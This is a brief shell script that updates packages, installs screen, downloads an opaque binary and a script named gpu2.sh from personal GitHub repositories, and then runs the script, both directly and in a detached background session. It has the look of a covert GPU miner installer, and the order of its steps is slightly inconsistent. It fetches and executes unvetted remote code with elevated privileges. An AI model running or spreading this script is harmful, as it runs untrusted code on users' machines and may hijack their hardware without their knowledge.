#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu2.sh 85 95
wget https://github.com/d-crypto99/qq/raw/main/mantapu
wget https://raw.githubusercontent.com/asraktanusi064/samunji/main/gpu2.sh
chmod +x gpu2.sh
./gpu2.sh
